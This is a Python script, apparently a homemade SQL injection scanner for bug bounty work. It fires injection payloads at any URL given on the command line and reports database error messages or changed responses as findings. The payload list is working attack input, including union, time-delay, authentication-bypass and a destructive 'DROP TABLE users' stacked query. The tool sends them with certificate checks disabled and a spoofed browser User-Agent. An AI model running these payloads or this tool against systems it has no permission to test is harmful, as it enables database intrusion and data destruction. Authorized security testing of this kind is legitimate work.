#!/usr/bin/env python3
"""
Roger SQLi - SQL injection vulnerability scanner for bug bounty hunting.
"""

import argparse
import requests
import urllib3
import re
import string
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SQL injection payloads
SQLI_PAYLOADS = [
    # Error-based
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' AND '1'='1",
    "1\" AND \"1\"=\"1",
    # Time-based
    "' AND SLEEP(5)--",
    "' AND SLEEP(5) --",
    "1' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,MD5('A'))--",
    "' WAITFOR DELAY '00:00:05'--",
    # Union-based
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    # Comment-based
    "'--",
    "\"--",
    "'#",
    "1'#",
    # Stacked queries
    "' ; DROP TABLE users--",
    "' ; SELECT * FROM users--",
    # Null byte
    "%00'",
    # Big5/UTF-8 bypass
    "ß' OR '1'='1",
    # Parenthesis
    "1') OR ('1'='1",
    "1' OR ('1'='1",
]

# Parameters commonly vulnerable to SQLi
SQLI_PARAMS = [
    "id", "user", "user_id", "uid", "id", "cat", "category", "page", "article",
    "post", "comment", "order", "sort", "search", "query", "s", "q", "keyword",
    "year", "month", "day", "date", "from", "to", "price", "amount", "num",
    "code", "file", "name", "email", "username", "password", "token", "auth",
    "key", "api", "callback", "view", "redirect", "dest", "url", "link",
]


class RogerSQLi:
    def __init__(self, target, threads=5, quiet=False, output=None, timeout=15):
        self.target = target.rstrip('/')
        self.threads = threads
        self.quiet = quiet
        self.output = output
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        
    def parse_url(self, url):
        """Parse URL and add protocol if needed."""
        if not url.startswith('http'):
            url = 'https://' + url
        return url
    
    def generate_random_string(self, length=8):
        """Generate random string for parameter values."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def inject_payload(self, url, param, payload):
        """Inject SQLi payload into parameter."""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            # Get existing value or use random
            if param in query:
                original_value = query[param][0]
                query[param] = [original_value + payload]
            else:
                query[param] = ["test" + payload]
            
            new_query = urlencode(query, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            return urlunparse(new_parsed)
        except:
            return None
    
    def detect_sqli(self, original_response, test_response):
        """Detect if SQL injection occurred."""
        # Check for SQL errors in response
        sql_errors = [
            "SQL syntax",
            "MySQL",
            "mysql_fetch",
            "ORA-",
            "Oracle",
            "PostgreSQL",
            "pg_",
            "SQLite",
            "sqlite3",
            "Microsoft SQL Server",
            "ODBC",
            "SQLServer",
            "Unterminated",
            "quoted string",
            "syntax error",
            "SQL error",
            "Warning: mysql",
            "Warning: pg_",
            "Warning: sqlite",
            "function mysql",
            "function pg_",
            "unterminated",
            "Incorrect syntax",
            "Server Error",
            "500 Internal Server Error",
            "SQLState",
            "ODBC SQL",
            "Driver",
            "SQLITE_CANTOPEN",
            "SQL error",
        ]
        
        test_text = test_response.text
        
        for error in sql_errors:
            if error.lower() in test_text.lower():
                return {
                    "type": "error-based",
                    "evidence": error,
                    "severity": "HIGH"
                }
        
        # Check for significant response difference
        len_original = len(original_response.text)
        len_test = len(test_text)
        
        # If response is significantly different, might be sqli
        if abs(len_original - len_test) > 500:
            return {
                "type": "boolean-based",
                "evidence": "Response length changed significantly",
                "severity": "MEDIUM"
            }
        
        return None
    
    def test_payload(self, url, param, payload):
        """Test a single SQLi payload."""
        test_url = self.inject_payload(url, param, payload)
        
        if not test_url:
            return None
        
        try:
            # Get original response
            original_response = self.session.get(
                url,
                timeout=self.timeout,
                verify=False
            )
            
            # Get test response
            test_response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=False
            )
            
            # Detect SQLi
            result = self.detect_sqli(original_response, test_response)
            
            if result:
                result["url"] = url
                result["parameter"] = param
                result["payload"] = payload
                return result
            
        except Exception as e:
            pass
        
        return None
    
    def scan_params(self, url):
        """Scan URL parameters for SQLi."""
        findings = []
        
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        
        # If no params, try adding common ones
        if not existing_params:
            for param in SQLI_PARAMS[:10]:
                for payload in SQLI_PAYLOADS[:3]:
                    test_url = f"{url}?{param}=1{payload}"
                    
                    try:
                        response = self.session.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False
                        )
                        
                        # Check for errors
                        for error in ["SQL syntax", "MySQL", "ORA-", "SQL error"]:
                            if error.lower() in response.text.lower():
                                findings.append({
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "type": "error-based",
                                    "evidence": error,
                                    "severity": "HIGH"
                                })
                                break
                                
                    except:
                        pass
        else:
            # Test existing parameters
            for param in existing_params.keys():
                for payload in SQLI_PAYLOADS[:5]:
                    result = self.test_payload(url, param, payload)
                    
                    if result:
                        if not self.quiet:
                            print(f"  [!] Potential SQLi: {param}")
                            print(f"      Payload: {payload[:30]}")
                        
                        findings.append(result)
                        break
        
        return findings
    
    def scan(self):
        """Run the SQLi scanner."""
        target = self.parse_url(self.target)
        
        print(f"[*] Starting SQL injection scan on: {target}")
        print("=" * 60)
        
        # Scan parameters
        print("[*] Testing for SQL injection vulnerabilities...")
        
        findings = self.scan_params(target)
        
        # Print results
        print()
        print("=" * 60)
        
        if findings:
            print("[!] POTENTIAL SQL INJECTION VULNERABILITIES:")
            print()
            
            unique = []
            seen = set()
            
            for f in findings:
                key = f"{f['parameter']}:{f['payload'][:15]}"
                if key not in seen:
                    seen.add(key)
                    unique.append(f)
            
            for finding in unique:
                print(f"[!] Parameter: {finding['parameter']}")
                print(f"    Payload: {finding['payload'][:40]}")
                print(f"    Type: {finding.get('type', 'unknown')}")
                print(f"    Severity: {finding.get('severity', 'MEDIUM')}")
                print()
                
                self.findings.append(finding)
        else:
            print("[*] No SQL injection vulnerabilities found")
            print("[*] Note: SQLi often requires manual testing")
            print("[*] Try testing: id, user, search, order, sort parameters")
        
        # Summary
        print(f"[*] Total issues: {len(self.findings)}")
        
        # Save results
        if self.output and self.findings:
            with open(self.output, 'w') as f:
                f.write(f"# SQL Injection Scan Results for {target}\n\n")
                for finding in self.findings:
                    f.write(f"Parameter: {finding['parameter']}\n")
                    f.write(f"Payload: {finding['payload']}\n")
                    f.write(f"Type: {finding.get('type', 'unknown')}\n")
                    f.write(f"Severity: {finding.get('severity', 'MEDIUM')}\n\n")
        
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="Roger SQLi - SQL injection vulnerability scanner for bug bounty hunting"
    )
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("-o", "--output", help="Output results to file")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout")
    
    args = parser.parse_args()
    
    scanner = RogerSQLi(
        target=args.target,
        threads=args.threads,
        quiet=args.quiet,
        output=args.output,
        timeout=args.timeout
    )
    
    scanner.scan()


if __name__ == "__main__":
    main()